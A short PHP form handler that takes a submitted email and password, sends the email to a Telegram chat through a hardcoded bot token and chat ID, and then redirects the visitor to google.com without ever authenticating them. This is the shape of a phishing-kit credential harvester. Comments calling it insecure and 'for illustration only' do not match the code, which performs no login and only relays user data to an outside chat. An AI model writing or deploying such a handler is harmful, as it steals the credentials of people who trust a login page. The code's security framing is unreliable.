<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"]; // NEVER store or log this directly!

    // **VERY IMPORTANT:**
    // 1. Validate and sanitize $email and $password to prevent attacks.
    // 2. Hash the password and compare it to the stored hash in your database.
    // 3.  Do NOT send the raw password to Telegram.

    // Example (INSECURE - for illustration only)
    $telegramBotToken = "8522432484:AAHdGiaeCD8T1xYxd-8lO2g47CIucVT316s";
    $telegramChatId = "8344813196";

    $message = "Login attempt (email only, password NOT sent):\nEmail: " . $email;

    $telegramApiUrl = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage?chat_id=" . $telegramChatId . "&text=" . urlencode($message);

    // Use file_get_contents or curl to send the request
    file_get_contents($telegramApiUrl);  // Basic example

    // After successful authentication (after password verification!), redirect
    header("Location: https://www.google.com/");
    exit();
}
?>
